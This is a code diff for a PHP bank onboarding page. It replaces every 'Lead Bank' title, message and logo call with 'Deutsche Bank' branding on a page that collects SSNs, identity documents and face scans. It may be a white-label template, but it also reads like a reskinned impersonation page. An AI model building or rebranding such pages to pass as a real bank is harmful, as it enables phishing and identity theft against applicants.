@@ -274,11 +274,11 @@ $onboardingEyebrow = match ($authRegion) {
     default => 'Germany account opening',
 };
 $onboardingTitle = match ($authRegion) {
-    'us' => 'Open your U.S. Lead Bank account',
-    'ca' => 'Open your Canadian Lead Bank account',
-    'uk' => 'Open your UK Lead Bank account',
-    'ch' => 'Open your Swiss Lead Bank account',
-    default => 'Open your Germany Lead Bank account',
+    'us' => 'Open your U.S. Deutsche Bank account',
+    'ca' => 'Open your Canadian Deutsche Bank account',
+    'uk' => 'Open your UK Deutsche Bank account',
+    'ch' => 'Open your Swiss Deutsche Bank account',
+    default => 'Open your Germany Deutsche Bank account',
 };
 $onboardingCopy = match ($authRegion) {
     'us' => 'Complete U.S. onboarding with SSN, address, phone, and identity verification.',
@@ -363,7 +363,7 @@ $onboardingAgentPhoto = $onboardingLink ? admin_profile_photo_url($onboardingLin
         <?= csrf_field() ?>
         <?php if ($onboardingLink): ?><input type="hidden" name="onboarding_ref" value="<?= e($onboardingToken) ?>"><?php endif; ?>
         <aside class="onboarding-rail">
-            <?php if (!$onboardingLink): ?><?= lead_logo('light') ?><?php endif; ?>
+            <?php if (!$onboardingLink): ?><?= brand_logo('light') ?><?php endif; ?>
             <div>
                 <div class="eyebrow"><?= e($onboardingEyebrow) ?></div>
                 <h1><?= e($onboardingTitle) ?></h1>
@@ -533,7 +533,7 @@ $onboardingAgentPhoto = $onboardingLink ? admin_profile_photo_url($onboardingLin
     <div class="biometric-atmosphere"></div>
     <div class="biometric-stage">
         <div class="biometric-topbar">
-            <?= lead_logo('light') ?>
+            <?= brand_logo('light') ?>
             <span class="biometric-secure"><i class="fa-solid fa-lock"></i> Bank-grade verification</span>
         </div>
         <div class="biometric-experience">
@@ -557,7 +557,7 @@ $onboardingAgentPhoto = $onboardingLink ? admin_profile_photo_url($onboardingLin
             <div class="biometric-success" data-biometric-success hidden>
                 <div class="verification-badge"><i class="fa-solid fa-shield-check"></i></div>
                 <h2>Face verification complete.</h2>
-                <p>Review your application details before submitting to Lead Bank.</p>
+                <p>Review your application details before submitting to Deutsche Bank.</p>
             </div>
             <div class="biometric-actions">
                 <button type="button" class="btn btn-light border" data-biometric-cancel>Return to application</button>
